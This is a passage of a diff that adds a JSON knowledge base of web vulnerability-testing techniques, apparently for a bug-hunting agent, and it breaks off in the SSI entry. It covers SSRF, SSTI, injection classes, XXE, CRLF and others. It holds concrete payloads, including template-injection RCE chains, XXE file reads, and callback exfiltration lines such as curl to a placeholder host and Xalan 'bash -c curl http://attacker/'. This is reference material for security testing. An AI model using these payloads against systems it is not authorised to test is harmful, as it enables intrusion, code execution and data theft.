@@ -1,0 +1,1210 @@
+{
+ "_comment": "Detailed web bug-hunting technique base. One entry per vulnerability class: what it is, what to find, how to test step-by-step, concrete techniques/tricks, and how to verify (marker + negative control). Synthesized from OWASP WSTG taxonomy + general security knowledge. Load via technique_lookup(class).",
+ "classes": [
+  {
+   "id": "ssrf",
+   "name": "Server-Side Request Forgery",
+   "summary": "The server fetches an attacker-influenced URL, letting you reach internal-only services (metadata, DB, admin) from inside the network.",
+   "objectives": [
+    "Find any parameter/field the server uses to make an outbound request (URL, webhook, image proxy, file import).",
+    "Confirm the server resolves the URL (DNS pingback / canary host).",
+    "Reach internal services and read cloud metadata."
+   ],
+   "how_to_test": [
+    "Inject a canary URL (burpcollaborator / your server) and watch for a callback.",
+    "Then target 169.254.169.254 (AWS), metadata.google.internal (GCP), 127.0.0.1, internal hostnames.",
+    "Enumerate internal ports via scheme/response differences."
+   ],
+   "techniques": [
+    "Bypass IP filter: 127.1, 0, 0x7f000001, 2130706433, 017700000001, [::1], 127.0.0.1.nip.io, http://127.0.0.1:80@evil/.",
+    "DNS rebinding: a name that resolves to allowed at check-time and internal at request-time (e.g. wp_safe_remote_*).",
+    "Redirect bypass: allow-listed host that 302s to an internal address.",
+    "Schemes: gopher://, dict://, file:// for protocol-level access."
+   ],
+   "verify": "Unique marker host receives the callback (proof of SSRF); a benign non-fetching control returns nothing."
+  },
+  {
+   "id": "request_smuggling",
+   "name": "HTTP Request Smuggling",
+   "summary": "Front-end and back-end disagree on where a request ends, letting you smuggle a second request that poisons the next user's request.",
+   "objectives": [
+    "Detect CL.TE / TE.CL / TE.TE desync between front and back.",
+    "Smuggle a request that captures or poisons the next victim request."
+   ],
+   "how_to_test": [
+    "Send a request with conflicting Content-Length and Transfer-Encoding headers and observe a timeout/desync.",
+    "Confirm the desync class, then smuggle a second request.",
+    "Target: session hijack (smuggle a request that captures the next user's cookie), cache poisoning, WAF bypass."
+   ],
+   "techniques": [
+    "CL.TE: front uses Content-Length, back uses Transfer-Encoding: chunked.",
+    "TE.CL: front uses Transfer-Encoding, back uses Content-Length.",
+    "HTTP/2 downgrade smuggling when the front speaks H2 and the back HTTP/1.1.",
+    "Response queue poisoning via a smuggled complete request."
+   ],
+   "verify": "A timing marker or a second request whose response lands on YOUR connection confirms the desync; send a control without the conflict and confirm no effect."
+  },
+  {
+   "id": "cache_poisoning",
+   "name": "Web Cache Poisoning",
+   "summary": "Poison a shared cache by injecting a payload into an unkeyed header/param, so the cached response (with your payload) is served to every visitor.",
+   "objectives": [
+    "Find unkeyed inputs reflected in the response (X-Forwarded-Host, X-Original-URL, custom X-*).",
+    "Confirm the cache serves the poisoned response to other requests."
+   ],
+   "how_to_test": [
+    "Send a request with a reflected unkeyed header carrying a marker.",
+    "Re-request the same resource WITHOUT the header and confirm the marker persists (cache hit).",
+    "Escalate: reflected XSS in a cached page = stored XSS for everyone."
+   ],
+   "techniques": [
+    "Unkeyed headers: X-Forwarded-Host, X-Forwarded-Scheme, X-Original-URL, X-Host, X-Forwarded-Port.",
+    "Cache deception: a cache that keys on the URL but serves the authenticated response to /profile/foo.css.",
+    "Vary header abuse to segment the cache."
+   ],
+   "verify": "Marker reflects on a second, clean request (proof of shared cache) - a control URL that is not cached returns no marker."
+  },
+  {
+   "id": "race_condition",
+   "name": "Race Condition / TOCTOU",
+   "summary": "Two parallel requests interleave with a check-then-use or a shared resource, producing an inconsistent state (double spend, duplicate account, privilege flip).",
+   "objectives": [
+    "Find a state-changing action with a check-then-act gap.",
+    "Fire parallel requests and detect the double effect."
+   ],
+   "how_to_test": [
+    "Identify spend/redeem/register/upload flows with a validation step.",
+    "Send the request N times in parallel (single-packet via HTTP/2, or Burp turbo intruder).",
+    "Compare the resulting state (balance, count, files)."
+   ],
+   "techniques": [
+    "TOCTOU: withdraw-twice, redeem-coupon-twice, register-same-email-twice.",
+    "File-upload race: upload -> check -> replace between check and use.",
+    "HTTP/2 single-packet attack to make requests truly simultaneous."
+   ],
+   "verify": "The double effect is observed (balance decremented once for two redemptions); sequential control requests produce no double effect."
+  },
+  {
+   "id": "ssti",
+   "name": "Server-Side Template Injection",
+   "summary": "User input is concatenated into a server-side template, letting you execute code in the templating engine.",
+   "objectives": [
+    "Detect the templating engine via probe payloads.",
+    "Escalate from template evaluation to code execution."
+   ],
+   "how_to_test": [
+    "Probe with {{7*7}}, ${7*7}, <%= 7*7 %>, #{7*7}, ${{7*7}}.",
+    "Identify the engine by the error/behavior of each.",
+    "Build a RCE chain for that engine."
+   ],
+   "techniques": [
+    "Jinja2: {{config.__class__.__init__.__globals__['os'].popen('id').read()}} or __mro__/__subclasses__.",
+    "FreeMarker/Java: <#assign ex='freemarker.template.utility.Execute'?new()>${ex('id')}.",
+    "Smarty: {system('id')}.",
+    "Filter bypass: nested attributes, |attr, string concat, unicode escapes."
+   ],
+   "verify": "{{7*7}} evaluates to 49 (marker), and a literal control ({{'7*7'}}) stays literal; RCE chain runs a marker command via callback."
+  },
+  {
+   "id": "deserialization",
+   "name": "Insecure Deserialization",
+   "summary": "Untrusted serialized data is deserialized into objects, allowing gadget chains to reach code execution.",
+   "objectives": [
+    "Spot serialized blobs in params/cookies (PHP O:, Java rO0AB/ACED, .NET, pickle).",
+    "Build a gadget chain to RCE."
+   ],
+   "how_to_test": [
+    "Identify the serialization format from a cookie/param.",
+    "Generate a payload with ysoserial (Java), PHPGGC (PHP), or a pickle/JSON gadget.",
+    "Fire it and watch for a marker command via callback."
+   ],
+   "techniques": [
+    "Java: CommonsCollections/CommonsBeanutils/Spring gadget chains via ysoserial.",
+    "PHP: PHPGGC chains (Monolog, Symfony, Laravel) + phar:// deserialization on file ops.",
+    "Python: pickle + __reduce__; yaml.unsafe_load.",
+    ".NET: ObjectDataProvider / Json.NET TypeNameHandling."
+   ],
+   "verify": "A marker command (touch /tmp/<marker> or a callback) actually fires; a malformed control blob is rejected without effect."
+  },
+  {
+   "id": "prototype_pollution",
+   "name": "Prototype Pollution",
+   "summary": "Merging attacker-controlled keys into an object reaches Object.prototype, polluting every object and enabling XSS/RCE gadgets.",
+   "objectives": [
+    "Find a merge/extend/assign of request data into an object.",
+    "Pollute __proto__/constructor.prototype and trigger a gadget."
+   ],
+   "how_to_test": [
+    "Test merge functions with __proto__ and constructor.prototype keys.",
+    "Confirm pollution (a property appears on every object).",
+    "Trigger a gadget (child_process options, template, status/body)."
+   ],
+   "techniques": [
+    "Client-side: location.hash / URLSearchParams merged without sanitizing __proto__ -> DOM XSS.",
+    "Server-side (Node): Object.assign/_.merge/$.extend of req.body -> RCE via polluted child_process/express options.",
+    "Gadgets: child_process.exec options, Handlebars/Jade options, express res.status override."
+   ],
+   "verify": "Pollution confirmed by reading a marker property on Object.prototype; a control merge of a safe key has no effect."
+  },
+  {
+   "id": "mass_assignment",
+   "name": "Mass Assignment",
+   "summary": "The framework binds request params to model fields, letting you set privileged fields (role, isAdmin, balance) the UI never exposes.",
+   "objectives": [
+    "Find a create/update endpoint that mass-binds request fields.",
+    "Inject a privileged field (role=admin, isAdmin=true, balance=9999)."
+   ],
+   "how_to_test": [
+    "Add isAdmin=true / role=admin / balance=... to a create/update request.",
+    "Observe whether the field is persisted + honored.",
+    "Also test nested objects + arrays (user.role=admin)."
+   ],
+   "techniques": [
+    "Laravel: guarded/$fillable gaps; Django: ModelForm fields; Rails: strong_parameters bypass via nested/array params.",
+    "JSON duplicate key (role=user&role=admin) or array value (role[]=user&role[]=admin).",
+    "Prototype-pollution-style: constructor.prototype in the body."
+   ],
+   "verify": "The privileged field is actually persisted + honored (e.g. your account gains admin); a control request without the field leaves role unchanged."
+  },
+  {
+   "id": "sql_injection",
+   "name": "SQL Injection",
+   "summary": "User input is interpolated into a SQL query, letting you read/modify/exfiltrate the database or reach the OS.",
+   "objectives": [
+    "Find an injectable parameter.",
+    "Determine the DBMS + injection type (error/union/blind/time).",
+    "Extract data or escalate."
+   ],
+   "how_to_test": [
+    "Probe with quote + comment markers, observe errors/differences.",
+    "Determine column count (ORDER BY / UNION SELECT NULL,...).",
+    "Use UNION, boolean-blind, time-blind, or error-based extraction; then escalate (file read/write, RCE via extensions)."
+   ],
+   "techniques": [
+    "MySQL: UNION SELECT, load_file(), INTO OUTFILE, SLEEP() time-blind.",
+    "PostgreSQL: COPY ... TO, dblink, lo_import, RCE via extensions/languages.",
+    "MSSQL: xp_cmdshell, OPENROWSET, stacked queries.",
+    "WAF bypass: encoding, case, comments, chunking (see bypass_lookup waf).",
+    "Second-order: stored value later used in a query without re-validating."
+   ],
+   "verify": "A boolean/UNION marker returns distinct data (1 vs 0, or a known string); a parameterized control query is inert."
+  },
+  {
+   "id": "nosql_injection",
+   "name": "NoSQL Injection",
+   "summary": "User input is passed into a NoSQL query (MongoDB, etc.) without sanitizing operators, bypassing auth or filters.",
+   "objectives": [
+    "Find a NoSQL query built from user input.",
+    "Inject operators ($ne, $gt, $regex, $where) to bypass auth or extract data."
+   ],
+   "how_to_test": [
+    "Send JSON operators in params (username=$ne, password=$ne).",
+    "Test $regex for blind extraction, $where for JS eval.",
+    "Try URL-encoded operator injection in GET params."
+   ],
+   "techniques": [
+    "Auth bypass: $ne / $gt on both fields.",
+    "Blind: $regex with ^a to enumerate values.",
+    "$where: sleep(5000) for time-based, or arbitrary JS."
+   ],
+   "verify": "The operator injection returns data it should not (auth bypass / a different record); a control with a literal value returns the normal response."
+  },
+  {
+   "id": "xss",
+   "name": "Cross-Site Scripting",
+   "summary": "Attacker-controlled markup/script is rendered in another user's browser, stealing sessions or hijacking actions.",
+   "objectives": [
+    "Find a reflection/storage/DOM sink.",
+    "Confirm script execution (not just reflection).",
+    "Escalate (session theft, account takeover)."
+   ],
+   "how_to_test": [
+    "Inject a marker payload into reflected/stored/DOM sinks.",
+    "Check WHERE it lands (HTML context, attribute, JS, URL) and craft a context-appropriate payload.",
+    "Confirm execution via a callback (not just a reflected string)."
+   ],
+   "techniques": [
+    "Context-aware payloads: <script>, <img onerror>, '><svg onload>, javascript: URL, attribute breakout.",
+    "DOM XSS: unsafe sinks (innerHTML, document.write, eval, location) + sources (location, hash, URLSearchParams).",
+    "Stored -> admin bot for account takeover (ap-stored-xss-admin-bot skill).",
+    "CSP/WAF bypass via bypass_lookup."
+   ],
+   "verify": "A unique callback (image/fetch to your server) actually fires - proof of execution; a plain reflected string that never executes is NOT a finding."
+  },
+  {
+   "id": "cors",
+   "name": "Cross-Origin Resource Sharing Misconfiguration",
+   "summary": "A misconfigured CORS policy lets a malicious site read a victim's cross-origin responses.",
+   "objectives": [
+    "Find an endpoint reflecting Origin into Access-Control-Allow-Origin with credentials.",
+    "Confirm a cross-origin read is possible."
+   ],
+   "how_to_test": [
+    "Send Origin: attacker.com and read Access-Control-Allow-Origin + Access-Control-Allow-Credentials.",
+    "Test null origin, trusted-subdomain, and missing Vary: Origin."
+   ],
+   "techniques": [
+    "Origin reflection + allow-credentials:true -> full cross-origin read.",
+    "null origin (sandboxed iframe).",
+    "Trusted-subdomain takeover -> CORS from that subdomain.",
+    "ACAC + wildcard; missing Vary: Origin (cache leaks a cross-origin response)."
+   ],
+   "verify": "A cross-origin page actually reads the victim response (demonstrable), not just a reflected header; a control origin is not reflected."
+  },
+  {
+   "id": "csrf",
+   "name": "Cross-Site Request Forgery",
+   "summary": "A victim's authenticated browser is tricked into making a state-changing request the attacker crafts.",
+   "objectives": [
+    "Find a state-changing action without a CSRF token (or with a bypassable one).",
+    "Demonstrate a cross-site request performs it."
+   ],
+   "how_to_test": [
+    "Test the action with and without the CSRF token.",
+    "Bypass techniques: token not validated, token predictable, token leaked, JSON CSRF, SameSite=Lax on non-idempotent methods."
+   ],
+   "techniques": [
+    "Remove the token; use a different session's token; predict the token.",
+    "JSON CSRF via text/plain with a form.",
+    "Empty-HMAC / null-token bypass (wp-empty-hmac skill).",
+    "SameSite=Lax bypass via a GET-like state change or a popup window."
+   ],
+   "verify": "The cross-site request actually performs the action (state changes) without the token; with the token validated, it is blocked."
+  },
+  {
+   "id": "jwt",
+   "name": "JSON Web Token Attacks",
+   "summary": "Weak JWT signing/validation lets you forge tokens and impersonate users.",
+   "objectives": [
+    "Find how the JWT is validated.",
+    "Forge a token with a chosen claim (sub/role/admin)."
+   ],
+   "how_to_test": [
+    "Decode the token; test alg:none.",
+    "Test HS256/RS256 key confusion (sign with the public key as HMAC secret).",
+    "Test kid injection (path traversal/SQLi in kid), jku/x5u to your key."
+   ],
+   "techniques": [
+    "alg:none: strip the signature.",
+    "RS256->HS256: sign with the public key.",
+    "kid: ../../dev/null or a SQLi payload to pick a key.",
+    "jku/x5u: point to an attacker-hosted JWK.",
+    "Weak secret -> crack with jwt_tool/hashcat."
+   ],
+   "verify": "A forged token is accepted (server returns authorized data for the impersonated user); an unmodified/invalid token is rejected."
+  },
+  {
+   "id": "oauth",
+   "name": "OAuth / SSO Weaknesses",
+   "summary": "Flaws in the OAuth/SSO flow let you steal authorization codes/tokens and take over accounts.",
+   "objectives": [
+    "Find a redirect_uri/state/client validation flaw.",
+    "Steal the code or token."
+   ],
+   "how_to_test": [
+    "Tamper redirect_uri (path/param variation, open redirect).",
+    "Drop or reuse state; check PKCE enforcement.",
+    "Test code/token reuse, client-secret leakage, response_type tampering."
+   ],
+   "techniques": [
+    "redirect_uri confusion: open redirect, path traversal, missing state.",
+    "state leak -> CSRF on the callback (bind victim's account to attacker's).",
+    "PKCE downgrade; code reuse; token theft via redirect.",
+    "Mix-up: send a victim's code to a different IdP."
+   ],
+   "verify": "An authorization code/token actually lands at an attacker-controlled endpoint; a control flow with correct redirect_uri is not redirected."
+  },
+  {
+   "id": "host_header",
+   "name": "Host Header Injection",
+   "summary": "The app trusts the Host header to build absolute URLs/routing, enabling password-reset poisoning, cache poisoning, or routing bypass.",
+   "objectives": [
+    "Find a place the Host header is reflected into a generated URL/route.",
+    "Exploit it (reset-link poisoning, cache poisoning, routing)."
+   ],
+   "how_to_test": [
+    "Send Host: attacker.com and watch where it is reflected (reset link, redirects, cached content).",
+    "Test X-Forwarded-Host / X-Host / X-Original-URL variants.",
+    "For password reset: trigger a reset and check the emailed link's host."
+   ],
+   "techniques": [
+    "Password-reset poisoning: Host: attacker.com -> the reset link points to your host -> steal the token.",
+    "Cache poisoning via Host (see cache_poisoning).",
+    "Routing bypass via Host / X-Forwarded-Host to reach internal vhosts.",
+    "Duplicate/invalid Host to desync proxies."
+   ],
+   "verify": "The reset link (or reflected URL) actually carries your Host value - proof of reflection; a control reset without a tampered Host uses the real host."
+  },
+  {
+   "id": "open_redirect",
+   "name": "Open Redirect",
+   "summary": "An attacker-controlled redirect target is honored, letting you phish or (chained) steal OAuth tokens.",
+   "objectives": [
+    "Find a redirect param that accepts an external URL.",
+    "Escalate (OAuth token theft, credential phishing)."
+   ],
+   "how_to_test": [
+    "Test ?url=/next -> ?url=//evil.com, https://trusted.com@evil.com, /%2f%2fevil.com, backslash.",
+    "Check whether the redirect is used in an OAuth flow (token theft)."
+   ],
+   "techniques": [
+    "//evil.com (protocol-relative), https://trusted.com@evil.com (userinfo), backslash, double-encode.",
+    "javascript: and data: (rare).",
+    "Chain: open redirect in redirect_uri -> steal OAuth authorization code."
+   ],
+   "verify": "The response actually redirects to your marker host; a control redirect to a whitelisted relative path stays on-site."
+  },
+  {
+   "id": "subdomain_takeover",
+   "name": "Subdomain Takeover",
+   "summary": "A subdomain's DNS points to a service that no longer exists, letting you claim it and serve content/steal cookies/CSRF from the parent.",
+   "objectives": [
+    "Enumerate subdomains (crt.sh, subfinder) + find dangling CNAMEs.",
+    "Claim the dangling service."
+   ],
+   "how_to_test": [
+    "Resolve each subdomain; find CNAMEs to unclaimed services (GitHub Pages, S3, Heroku, Azure...).",
+    "Check the service returns a not-claimed signature.",
+    "Claim it and prove control."
+   ],
+   "techniques": [
+    "Dangling CNAME to github.io, s3.amazonaws.com, herokuapp, azure, shopify, etc.",
+    "DNS enumeration via crt.sh / Certificate Transparency.",
+    "Naked-domain vs wildcard resolution."
+   ],
+   "verify": "The service accepts the claim and serves YOUR content on that subdomain; a control subdomain resolves to a live, owned service."
+  },
+  {
+   "id": "idor",
+   "name": "Insecure Direct Object Reference (IDOR / BOLA)",
+   "summary": "An object reference (id, uuid, filename) is used without an authorization check, letting you read/act on other users' objects.",
+   "objectives": [
+    "Find object references (id, uuid, username, filename).",
+    "Access another user's object across roles."
+   ],
+   "how_to_test": [
+    "Enumerate /users/me -> /users/other-guid; ?id=1 -> ?id=2.",
+    "Test UUID vs sequential id; parameterized refs; API version confusion.",
+    "Verify by reading another user's data, never just 200 OK."
+   ],
+   "techniques": [
+    "Change the object id/uuid/filename; mass-assign on PATCH to bind another object.",
+    "API version: /v2 requires auth, /v1 does not.",
+    "Nested refs: /users/{id}/files/{fileId}.",
+    "UUIDv1 (guessable timestamp-based) vs UUIDv4."
+   ],
+   "verify": "You actually read/act on ANOTHER user's object (different data returned) - proof of broken authorization; your own object is the control."
+  },
+  {
+   "id": "graphql",
+   "name": "GraphQL",
+   "summary": "GraphQL exposes a flexible query interface; introspection, batching, and missing field-level authz become bugs.",
+   "objectives": [
+    "Dump the schema (introspection).",
+    "Find excessive data exposure, field/authorization bypass, or DoS."
+   ],
+   "how_to_test": [
+    "Introspection query to dump the full schema.",
+    "Query hidden/privileged fields the UI never exposes.",
+    "Batching + aliases to bypass rate limits and force deep recursion."
+   ],
+   "techniques": [
+    "Introspection: __schema query to list types and fields.",
+    "Aliases: many aliased fields to bypass a per-query limit.",
+    "Batching: multiple operations in one request to test IDOR across objects.",
+    "Depth/recursion DoS; field-level authz bypass (query admin-only fields)."
+   ],
+   "verify": "A query for a field the UI hides actually returns data; a control query for an allowed field returns normally."
+  },
+  {
+   "id": "websocket",
+   "name": "WebSocket Attacks",
+   "summary": "WebSocket connections may lack Origin checks or per-message authorization, enabling hijacking or cross-user actions.",
+   "objectives": [
+    "Find a WebSocket endpoint with weak Origin/authorization.",
+    "Hijack or inject messages."
+   ],
+   "how_to_test": [
+    "Connect and check the Origin/CSRF-token validation on the handshake.",
+    "Test per-message authorization (auth on connect only).",
+    "Test cross-site WebSocket hijacking from a browser."
+   ],
+   "techniques": [
+    "Cross-site WebSocket hijacking (no Origin check) -> read/write the victim's socket.",
+    "Message smuggling / injection into the socket stream.",
+    "Authorization on connect but not per-message."
+   ],
+   "verify": "A cross-origin page (or a different user) can read/write the socket - proof of missing Origin/authz; a control with a valid Origin is blocked."
+  },
+  {
+   "id": "file_upload",
+   "name": "File Upload",
+   "summary": "An upload endpoint accepts a file that is later executed/served, leading to RCE or stored XSS.",
+   "objectives": [
+    "Find an upload endpoint + where files are served.",
+    "Upload an executable (shell) or a stored-XSS file."
+   ],
+   "how_to_test": [
+    "Upload a benign file and locate its URL + execution context.",
+    "Bypass extension/type/content checks (see bypass_lookup).",
+    "Upload a web shell (if server-side execution) or an HTML/SVG (stored XSS)."
+   ],
+   "techniques": [
+    "Extension bypass: .php5, .phtml, .php.jpg, .phar, double extension, null byte.",
+    "Content-type/MIME spoofing; magic-byte spoofing (GIF89a + PHP).",
+    "SVG XSS; polyglot files (JPEG+JS).",
+    "Filename/path control -> overwrite or place outside the upload dir."
+   ],
+   "verify": "The uploaded shell executes a marker command (or the SVG fires a callback) - proof of execution; a control benign file is served inertly."
+  },
+  {
+   "id": "path_traversal_lfi",
+   "name": "Path Traversal / Local File Inclusion",
+   "summary": "A file path is built from user input, letting you read arbitrary files or include a file (LFI to RCE).",
+   "objectives": [
+    "Find a file/read/include param.",
+    "Read a sensitive file (or include a shell -> RCE)."
+   ],
+   "how_to_test": [
+    "../../../../etc/passwd, encoded variants.",
+    "For LFI, include a file you control (upload, /proc/self/environ, php://filter).",
+    "LFI to RCE via wrappers/log poisoning/phpinfo."
+   ],
+   "techniques": [
+    "Encoding: ..%2f, %252e%252e, ..%252f, double-encode, null byte (legacy).",
+    "LFI to RCE: php://filter/convert.base64-encode to read source, /proc/self/fd, log poisoning, phpinfo(), temp-file upload.",
+    "Windows: ..\\, absolute paths."
+   ],
+   "verify": "A known file's content is actually read (marker: /etc/passwd contents); a control path that is not traversed returns the intended file."
+  },
+  {
+   "id": "command_injection",
+   "name": "Command Injection",
+   "summary": "User input reaches a shell command, letting you execute OS commands.",
+   "objectives": [
+    "Find a param passed to a shell/system call.",
+    "Inject a command separator + a marker command."
+   ],
+   "how_to_test": [
+    "Inject ; | & && || backtick $() and a marker command.",
+    "Detect blind injection via timing (sleep) or a callback (curl/wget)."
+   ],
+   "techniques": [
+    "Separators: ; | & && || backtick $() %0a (newline).",
+    "Blind: sleep 5 (time-based), or curl http://your-host/$(id) (callback exfil).",
+    "Filter bypass: variable expansion, base64, $(tr), unicode."
+   ],
+   "verify": "A marker command actually executes (callback received / sleep observed); a control with no separator runs the intended command."
+  },
+  {
+   "id": "xxe",
+   "name": "XML External Entity (XXE)",
+   "summary": "An XML parser resolves external entities, letting you read local files, SSRF, or DoS.",
+   "objectives": [
+    "Find an endpoint parsing XML.",
+    "Inject an external entity to read a file or SSRF."
+   ],
+   "how_to_test": [
+    "Send a crafted XML with a DOCTYPE + external entity.",
+    "Exfiltrate via the response (or OOB via a callback)."
+   ],
+   "techniques": [
+    "<!DOCTYPE x [<!ENTITY e SYSTEM 'file:///etc/passwd'>]> &e;.",
+    "Blind/OOB: SYSTEM with a callback URL exfiltration.",
+    "Parameter entities + XInclude for no-DOCTYPE cases; billion-laughs DoS.",
+    "SAML/SOAP/svg endpoints are common XXE sinks."
+   ],
+   "verify": "A known file's content is returned in the response (or a callback fires) - proof; a control XML without the entity returns normally."
+  },
+  {
+   "id": "crlf_injection",
+   "name": "CRLF / HTTP Header Injection",
+   "summary": "Injection of carriage-return and line-feed bytes (%0d%0a) into user-controlled values that are reflected into HTTP headers, logs, or other newline-delimited protocols. It breaks the HTTP framing to enable response splitting, header injection, XSS, cache poisoning, request smuggling, and even authentication bypass when session files are poisoned.",
+   "objectives": [
+    "Find parameters reflected into response headers, redirects, or log/session files",
+    "Inject CRLF to terminate headers and forge additional headers or a second response",
+    "Escalate to XSS, open redirect, request smuggling, SSRF, or session/auth bypass"
+   ],
+   "how_to_test": [
+    "Identify values echoed into a Location/Set-Cookie/X-Custom-Header or a request path",
+    "Send `%0d%0a` (and `%0a` alone) and inspect whether a new header or body line appears in the response",
+    "Try `/%0d%0aSet-Cookie:test=1` and check if the cookie is actually set",
+    "Test URL-path injection with `/%3f%0d%0aLocation:%0d%0aContent-Type:text/html...` for response-body XSS",
+    "For pre-auth flows, inject raw CRLF into persisted session fields (Basic auth, cookie subfields) and reload the session"
+   ],
+   "techniques": [
+    "`?user_input=Value%0d%0a%0d%0a<script>alert(1)</script>` for reflected-header XSS",
+    "`/%0d%0aLocation:%20http://attacker.com` for open redirect via header splitting",
+    "`GET /%20HTTP/1.1%0d%0aHost:x%0d%0aConnection:keep-alive%0d%0a%0d%0aGET /redir HTTP/1.1...` for request smuggling / response queue poisoning",
+    "Unicode newline bypass: `%E2%80%A8` (U+2028), `%E2%80%A9` (U+2029), `%C2%85` (NEL) when literal CR/LF is stripped",
+    "PHP SoapClient `user_agent` CRLF to inject a full second HTTP request (SSRF); session-file poisoning with `user=root\\ntfa_verified=1`"
+   ],
+   "verify": "Positive marker: inject `%0d%0aSet-Cookie:crlf=<random>;` and confirm the response sets that exact cookie. Negative control: resend the same request URL-encoding the CRLF (`%250d%250a`) — the cookie must NOT appear, proving the server did not decode it itself and that the split is genuinely caused by raw CRLF."
+  },
+  {
+   "id": "ldap_injection",
+   "name": "LDAP Injection",
+   "summary": "Manipulation of LDAP filter expressions built by concatenating unsanitized user input, to bypass authentication or extract directory data. Unlike SQL, LDAP has no multi-statement option, so impact is typically auth bypass, blind data dumping via boolean oracles, and attribute enumeration.",
+   "objectives": [
+    "Break out of the LDAP filter with parentheses and wildcards to force a true/false match",
+    "Bypass login checks by neutralizing the password clause",
+    "Blind-extract attribute values character by character"
+   ],
+   "how_to_test": [
+    "Find login/search fields whose value is dropped into an LDAP filter like `(&(user=X)(password=Y))`",
+    "Inject `*)(` sequences to break structure: `user=*)(&)` and `password=*`",
+    "Probe boolean responses with `*)(objectClass=*))(&objectClass=void` (true) vs `void)(objectClass=void))(&objectClass=void` (false)",
+    "Iterate `(&(sn=admin)(password=A*))` over an alphabet to recover a stored password",
+    "Brute-force attribute names (cn, mail, uid, userPassword, sn...) using `*)(attr=value*` oracles"
+   ],
+   "techniques": [
+    "`user=*)(|(password=*` + `password=test)` -> `(&(user=*)(|(password=*)(password=test)))` always true",
+    "`username=admin)(!(&(|` + `pass=any))` -> makes `(|)` FALSE so password check is satisfied",
+    "Null-byte termination `user=*))%00` to discard the remainder of the filter",
+    "Blind dump: `(&(sn=administrator)(password=M*))` -> OK means first char is M, then extend prefix",
+    "Attribute enumeration script testing `cn, sn, uid, userPassword, mail, ...` with `*)(attr=<char>*`"
+   ],
+   "verify": "Positive marker: send `user=*)(&)(&` and observe an authenticated/successful response distinct from a normal failed login. Negative control: send an unbalanced filter that throws an error (e.g. `user=(((&`), confirming the backend is a real LDAP parser and that the true/false differential is caused by your injection rather than an unrelated code path."
+  },
+  {
+   "id": "xpath_injection",
+   "name": "XPath Injection",
+   "summary": "Injection into XPath expressions that query or navigate XML documents, analogous to SQL injection but against XML backends. Because XPath lacks access-control layers like SQL grants, a successful injection can read the entire document, dump schema/structure, and bypass authentication.",
+   "objectives": [
+    "Break out of XPath predicates to bypass login and select arbitrary nodes",
+    "Enumerate the XML schema/structure and element names",
+    "Blind-extract or exfiltrate document contents, including out-of-band"
+   ],
+   "how_to_test": [
+    "Locate login/search where input is concatenated into XPath like `//user[name/text()='X' and password/text()='Y']`",
+    "Inject `' or '1'='1` (or `' or true() or '`) into both fields to force a true predicate",
+    "Use union-style payloads `')] | //user/password[('')=('` to return all values",
+    "Enumerate structure with `and count(/*[1]/*)=N` and names with `name(/*[1]/*[1])` / `string-to-codepoints(...)`",
+    "For blind cases, test `substring(...)='x'` boolean oracles or trigger OOB via `doc(concat('http://attacker/', ...))`"
+   ],
+   "techniques": [
+    "`' or true() or '` or `admin' or '1'='2` to bypass auth",
+    "`')] | //user/node()[('')=('` to dump all values in the document",
+    "`')] | //password%00` abusing null-byte to truncate the remaining query",
+    "Blind char extraction: `' or substring(//user[1]/child::node()[1],1,1)='a' or ''='`",
+    "OOB exfil: `doc(concat('http://attacker/oob/', name(/*[1]/*[1])))` or `doc-available(...)`; file read via `doc('file:///etc/passwd')`"
+   ],
+   "verify": "Positive marker: submit `' or true() or '` as username and confirm the account is selected (response differs from invalid credentials). Negative control: submit an expression that must be false, e.g. `' or false() or '` — the login should fail again, confirming the truth table is driving the result rather than an unrelated error path."
+  },
+  {
+   "id": "xslt_server_side_injection",
+   "name": "XSLT Server-Side Injection",
+   "summary": "Injection into XSLT stylesheets that are parsed server-side to transform XML, enabling file read, SSRF, arbitrary file write, and RCE via processor-specific extension functions. Impact depends heavily on the XSLT engine (libxslt, Saxon, Xalan, .NET) and which extension features are enabled.",
+   "objectives": [
+    "Fingerprint the XSLT version/vendor via system-property()",
+    "Read local files, perform SSRF, and (where possible) execute OS commands",
+    "Exploit processor-specific primitives (php:function, Java/.NET extensions, exsl:document)"
+   ],
+   "how_to_test": [
+    "Find a feature that uploads/accepts XSLT or references an attacker stylesheet",
+    "Fingerprint with `system-property('xsl:version')` and `xsl:vendor`",
+    "Try `unparsed-text('/etc/passwd','utf-8')` or `document('/etc/passwd')` for file read",
+    "Try `php:function('shell_exec','sleep 10')` (PHP/libxslt) or Java Runtime exec for RCE",
+    "Test `xsl:include href='http://attacker/...'` and `document('http://127.0.0.1:8000/')` for SSRF/port scan"
+   ],
+   "techniques": [
+    "File read (Saxon/libxslt): `<xsl:value-of select=\"unparsed-text('/etc/passwd','utf-8')\"/>` or XXE via `<!DOCTYPE xxe [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>`",
+    "RCE PHP: `php:function('shell_exec','sleep 10')`; Xalan-J: `xmlns:rt=\"http://xml.apache.org/xalan/java/java.lang.Runtime\"` + `rt:exec($r,'bash -c curl http://attacker/')`",
+    "RCE Saxon: `xmlns:rt=\"java:java.lang.Runtime\"` + `rt:exec($r,'bash -c id > /tmp/x')`; .NET: `<msxsl:script language=\"C#\">` with `Process.Start`",
+    "File write: `<xsl:result-document href=\"x.txt\">` (XSLT 2.0) or libxslt `exsl:document` to a web-served/exec path",
+    "Directory listing / read via PHP: `php:function('opendir','/')` + `php:function('readdir')` or `php:function('assert','var_dump(scandir(...))')`"
+   ],
+   "verify": "Positive marker: run `unparsed-text('/etc/passwd','utf-8')` and observe file contents in output. Negative control: run `document('/etc/passwd')` on libxslt — it usually errors because the file isn't valid XML; if both behave identically you may be hitting a generic error handler rather than real file-read, so confirm a second distinct file (e.g. `/etc/hostname`) returns its actual text."
+  },
+  {
+   "id": "ssi_esi_injection",
+   "name": "SSI / ESI (Server-Side & Edge-Side Include) Injection",
+   "summary": "Injection of Server-Side Include directives (`<!--#... -->`) evaluated by web servers, or Edge-Side Include tags (`<esi:...>`) evaluated by CDNs/caches, into cached or served content. Enables arbitrary file/include loading, command execution, header injection, and cookie/secret exfiltration.",
+   "objectives": [
+    "Detect whether SSI/ESI directives are evaluated on the server or edge",
+    "Achieve command execution (SSI) or include-based XSS/cookie theft (ESI)",
+    "Exfiltrate secrets by injecting includes that reach attacker infrastructure"
+   ],
+   "how_to_test": [
+    "Look for .shtml/.stm pages or any reflection into HTML; submit `<!--#echo var=\"DATE_LOCAL\" -->` and check for a rendered date",
+    "Test `<!--#exec cmd=\"id\" -->` for command execution",
